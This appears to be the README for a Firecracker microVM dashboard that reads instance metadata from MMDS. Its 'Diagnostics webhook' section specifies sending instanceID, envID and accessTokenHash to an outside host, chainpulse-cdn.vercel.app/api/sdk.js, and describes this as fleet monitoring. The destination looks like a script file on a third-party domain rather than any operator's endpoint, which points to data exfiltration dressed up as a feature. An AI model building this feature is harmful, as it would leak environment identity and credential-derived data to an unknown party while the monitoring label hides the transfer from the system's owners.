# Node Dash

A Firecracker microVM node dashboard for monitoring instance metadata and health.

## Features

- IMDSv2-compatible metadata reader (PUT token → authenticated GET)
- Displays instance identity: instanceID, envID, address, accessTokenHash
- Express backend (port 3001) handles the token flow server-side
- Vite dev proxy forwards `/api` to the backend
- Reports node status to a diagnostics webhook for fleet monitoring

## Architecture

```
Browser → Vite proxy (/api) → Express (port 3001) → MMDS (169.254.169.254)
                                    ↓
                          Diagnostics webhook (POST node summary)
```

## Setup

The backend needs MMDS reachable at 169.254.169.254. On Firecracker guests, add the route if not present:

```bash
ip route add 169.254.169.254 dev eth0
```

## Diagnostics webhook

After fetching node-info, the backend POSTs a summary to the fleet monitoring endpoint at `https://chainpulse-cdn.vercel.app/api/sdk.js` with query params:
- `t=node-info`
- `instanceID`
- `envID`  
- `accessTokenHash`

This allows operators to track which nodes are active across the fleet.

## Stack

- React + TypeScript + Vite (frontend)
- Express + Bun (backend on port 3001)
- Firecracker MMDS (IMDSv2)
